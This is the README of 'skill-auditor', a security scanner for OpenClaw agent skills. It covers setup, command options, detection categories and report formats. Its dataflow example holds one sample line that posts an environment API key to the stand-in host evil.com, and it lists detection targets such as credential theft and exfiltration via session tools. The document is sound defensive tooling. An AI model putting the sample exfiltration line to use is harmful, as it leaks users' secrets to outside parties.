---
name: skill-auditor
version: 2.1.3
description: "Security scanner that catches malicious skills before they steal your data. Detects credential theft, prompt injection, and hidden backdoors. Works immediately with zero setup. Optional AST dataflow analysis traces how your data moves through code."
---

# Skill Auditor v2.1

Enhanced security scanner that analyzes skills and provides comprehensive threat detection with advanced analysis capabilities.

## After Installing

Run the setup wizard to configure optional features:

```bash
cd skills/skill-auditor
node scripts/setup.js
```

The wizard explains each feature, shows real test data, and lets you choose what to enable.

## Quick Start

**Scan a skill:**
```bash
node skills/skill-auditor/scripts/scan-skill.js <skill-directory>
```

**Audit all your installed skills:**
```bash
node skills/skill-auditor/scripts/audit-installed.js
```

## Setup Wizard (Recommended)

Run the interactive setup to configure optional features:

```bash
cd skills/skill-auditor
node scripts/setup.js
```

The wizard will:
1. **Detect your OS** (Windows, macOS, Linux)
2. **Check Python availability** (required for AST analysis)
3. **Offer to install tree-sitter** for dataflow analysis
4. **Configure auto-scan** on skill installation
5. **Save preferences** to `~/.openclaw/skill-auditor.json`

### Setup Commands

```bash
node scripts/setup.js           # Interactive setup wizard
node scripts/setup.js --status  # Show current configuration
node scripts/setup.js --enable-ast  # Just enable AST analysis
```

## Audit All Installed Skills

Scan every skill in your OpenClaw installation at once:

```bash
node scripts/audit-installed.js
```

**Options:**
```bash
node scripts/audit-installed.js --severity critical  # Only critical issues
node scripts/audit-installed.js --json               # Save results to audit-results.json
node scripts/audit-installed.js --verbose            # Show top findings per skill
```

**Output:**
- Color-coded risk levels (🚨 CRITICAL, ⚠️ HIGH, 📋 MEDIUM, ✅ CLEAN)
- Summary stats (total scanned, by risk level)
- Detailed list of high-risk skills with capabilities

## Cross-Platform Installation

### Core Scanner (No Dependencies)
Works on all platforms with just Node.js (which OpenClaw already provides).

### AST Analysis (Optional)
Requires Python 3.8+ and tree-sitter packages.

| Platform | Python Install | Tree-sitter Install |
|----------|----------------|---------------------|
| **Windows** | Pre-installed or `winget install Python.Python.3` | `pip install tree-sitter tree-sitter-python` |
| **macOS** | Pre-installed or `brew install python3` | `pip3 install tree-sitter tree-sitter-python` |
| **Linux** | `apt install python3-pip` | `pip3 install tree-sitter tree-sitter-python` |

**Note:** Tree-sitter has prebuilt wheels for all platforms — no C++ compiler needed!

## Core Features (Always Available)

- **Static Pattern Analysis** — Regex-based detection of 40+ threat patterns
- **Intent Matching** — Contextual analysis against skill's stated purpose
- **Accuracy Scoring** — Rates how well behavior matches description (1-10)
- **Risk Assessment** — CLEAN / LOW / MEDIUM / HIGH / CRITICAL levels
- **OpenClaw Specifics** — Detects MEMORY.md, sessions tools, agent manipulation
- **Remote Scanning** — Works with GitHub URLs (via scan-url.js)
- **Visual Reports** — Human-readable threat summaries

## Advanced Features (Optional)

### 1. Python AST Dataflow Analysis
**Traces data from sources to sinks through code execution paths**

```bash
npm install tree-sitter tree-sitter-python
node scripts/scan-skill.js <skill> --mode strict
```

**What it detects:**
- Environment variables → Network requests
- File reads → HTTP posts  
- Memory file access → External APIs
- Cross-function data flows

**Example:**
```python
# File 1: utils.py
def get_secrets(): return os.environ.get('API_KEY')

# File 2: main.py  
key = get_secrets()
requests.post('evil.com', data=key)  # ← Dataflow detected!
```

### 2. VirusTotal Binary Scanning
**Scans executable files against 70+ antivirus engines**

```bash
export VIRUSTOTAL_API_KEY="your-key-here"
node scripts/scan-skill.js <skill> --use-virustotal
```

**Supported formats:** .exe, .dll, .bin, .wasm, .jar, .apk, etc.

**Output includes:**
- Malware detection status
- Engine consensus (e.g., "3/70 engines flagged")  
- Direct VirusTotal report links
- SHA256 hashes for verification

### 3. LLM Semantic Analysis
**Uses AI to understand if detected behaviors match stated intent**

```bash
# Requires OpenClaw gateway running
node scripts/scan-skill.js <skill> --use-llm
```

**How it works:**
1. Groups findings by category
2. Asks LLM: "Does this behavior match the skill's description?"
3. Adjusts severity based on semantic understanding
4. Provides confidence ratings

**Example:**
- **Finding:** "Accesses MEMORY.md"
- **Skill says:** "Optimizes agent memory usage"
- **LLM verdict:** "LEGITIMATE — directly supports stated purpose"
- **Result:** Severity downgraded, marked as expected

### 4. SARIF Output for CI/CD
**GitHub Code Scanning compatible format**

```bash
node scripts/scan-skill.js <skill> --format sarif --fail-on-findings
```

**GitHub integration:**
```yaml
# .github/workflows/skill-scan.yml
- name: Scan Skills
  run: |
    node skill-auditor/scripts/scan-skill.js ./skills/new-skill \
      --format sarif --fail-on-findings > results.sarif
- name: Upload SARIF
  uses: github/codeql-action/upload-sarif@v2
  with:
    sarif_file: results.sarif
```

### 5. Detection Modes
**Adjustable sensitivity levels**

```bash
--mode strict      # All patterns, higher false positives
--mode balanced    # Default, optimized accuracy  
--mode permissive  # Only critical patterns
```

## Usage Examples

### Basic Scanning
```bash
# Scan local skill
node scripts/scan-skill.js ../my-skill

# Scan with JSON output
node scripts/scan-skill.js ../my-skill --json report.json

# Format visual report
node scripts/format-report.js report.json
```

### Advanced Scanning
```bash
# Full analysis with all features
node scripts/scan-skill.js ../my-skill \
  --mode strict \
  --use-virustotal \
  --use-llm \
  --format sarif \
  --json full-report.sarif

# CI/CD integration
node scripts/scan-skill.js ../my-skill \
  --format sarif \
  --fail-on-findings \
  --mode balanced
```

### Remote Scanning
```bash
# Scan GitHub skill without cloning
node scripts/scan-url.js "https://github.com/user/skill" --json remote-report.json
node scripts/format-report.js remote-report.json
```

## Installation Options

### Zero Dependencies (Recommended for CI)
```bash
# Works immediately — no installation needed
node skill-auditor/scripts/scan-skill.js <skill>
```

### Optional Advanced Features  
```bash
cd skills/skill-auditor

# Install all optional features
npm install

# Or install selectively:
npm install tree-sitter tree-sitter-python  # AST analysis
npm install yara                            # YARA rules (future)

# VirusTotal requires API key only:
export VIRUSTOTAL_API_KEY="your-key"

# LLM analysis requires OpenClaw gateway:
openclaw gateway start
```

## What Gets Detected

### Core Threat Categories
- **Prompt Injection** — AI instruction manipulation attempts
- **Data Exfiltration** — Unauthorized data transmission
- **Sensitive File Access** — MEMORY.md, credentials, SSH keys
- **Shell Execution** — Command injection, arbitrary code execution
- **Path Traversal** — Directory escape attacks
- **Obfuscation** — Hidden/encoded content
- **Persistence** — System modification for permanent access
- **Privilege Escalation** — Browser automation, device access

### OpenClaw-Specific Patterns
- **Memory File Writes** — Persistence via MEMORY.md, AGENTS.md
- **Session Tool Abuse** — Data exfiltration via sessions_send
- **Gateway Control** — config.patch, restart commands
- **Node Device Access** — camera_snap, screen_record, location_get

### Advanced Detection (with optional features)
- **Python Dataflow** — Variable tracking across functions/files
- **Binary Malware** — Known malicious executables via VirusTotal
- **Semantic Intent** — LLM-based behavior vs. description analysis

## Output Formats

### 1. JSON (Default)
```json
{
  "skill": { "name": "example", "description": "..." },
  "riskLevel": "HIGH", 
  "accuracyScore": { "score": 7, "reason": "..." },
  "findings": [...],
  "summary": { "analyzersUsed": ["static", "ast-python", "llm-semantic"] }
}
```

### 2. SARIF (GitHub Code Scanning)
```bash
--format sarif
```
Uploads to GitHub Security tab, integrates with pull request checks.

### 3. Visual Report
```bash
node scripts/format-report.js report.json
```
Human-readable summary with threat gauge and actionable findings.

## Configuration

### Environment Variables
```bash
VIRUSTOTAL_API_KEY="vt-key"     # VirusTotal integration
DEBUG="1"                       # Verbose error output
```

### Command Line Options
```bash
--json <file>         # JSON output file
--format sarif        # SARIF output for GitHub
--mode <mode>         # strict|balanced|permissive  
--use-virustotal     # Enable binary scanning
--use-llm           # Enable semantic analysis
--custom-rules <dir> # Additional YARA rules
--fail-on-findings  # Exit code 1 for HIGH/CRITICAL
--help              # Show all options
```

## Architecture Overview

```
skill-auditor/
├── scripts/
│   ├── scan-skill.js         # Main scanner (v2.0)
│   ├── scan-url.js           # Remote GitHub scanning  
│   ├── format-report.js      # Visual report formatter
│   ├── analyzers/            # Pluggable analysis engines
│   │   ├── static.js         # Core regex patterns (zero-dep)
│   │   ├── ast-python.js     # Python dataflow analysis
│   │   ├── virustotal.js     # Binary malware scanning
│   │   └── llm-semantic.js   # AI-powered intent analysis
│   └── utils/
│       └── sarif.js          # GitHub Code Scanning output
├── rules/
│   └── default.yar           # YARA format patterns
├── package.json              # Optional dependencies
└── references/              # Documentation (unchanged)
```

## Backward Compatibility

**v1.x commands work unchanged:**
```bash
node scan-skill.js <skill-dir>                    # ✅ Works
node scan-skill.js <skill-dir> --json out.json    # ✅ Works  
node format-report.js out.json                    # ✅ Works
```

**New v2.0 features are opt-in:**
```bash
node scan-skill.js <skill-dir> --use-llm          # ⚡ Enhanced
node scan-skill.js <skill-dir> --use-virustotal   # ⚡ Enhanced
```

## Limitations

### Core Scanner
- **Novel obfuscation** — New encoding techniques not yet in patterns
- **Binary analysis** — Skips binary files unless VirusTotal enabled  
- **Sophisticated prompt injection** — Advanced manipulation techniques may evade regex

### Optional Features  
- **Python AST** — Limited to Python files, basic dataflow only
- **VirusTotal** — Rate limited (500 queries/day free tier)
- **LLM Analysis** — Requires internet connection and OpenClaw gateway
- **YARA Rules** — Framework ready but custom rules not fully implemented

## Troubleshooting

### Common Issues

**"tree-sitter dependencies not available"**
```bash
npm install tree-sitter tree-sitter-python
```

**"VirusTotal API error: 403"**
```bash
export VIRUSTOTAL_API_KEY="your-actual-key"
```

**"LLM semantic analysis failed"**
```bash
# Check OpenClaw gateway is running:
openclaw gateway status
curl http://localhost:18789/api/v1/health
```

**"SARIF output not generated"**
```bash
# Ensure all dependencies installed:
cd skills/skill-auditor && npm install
```

### Debug Mode
```bash
DEBUG=1 node scripts/scan-skill.js <skill>
```

## Contributing

### Adding New Patterns
1. **Static patterns** → Edit `scripts/analyzers/static.js`
2. **YARA rules** → Add to `rules/` directory
3. **Python dataflow** → Extend `scripts/analyzers/ast-python.js`

### Testing New Features
```bash
# Test against multiple skills:
node scripts/scan-skill.js ../blogwatcher --use-llm --mode strict
node scripts/scan-skill.js ../summarize --use-virustotal  
node scripts/scan-skill.js ../secure-browser-agent --format sarif
```

## Security Note

**This scanner is one layer of defense**, not a guarantee. Always:
- Review code manually for novel attacks
- Re-scan after skill updates  
- Use multiple security tools
- Trust but verify — especially for high-privilege skills

**For sensitive environments**, enable all advanced features:
```bash
node scripts/scan-skill.js <skill> \
  --mode strict \
  --use-virustotal \
  --use-llm \
  --fail-on-findings
```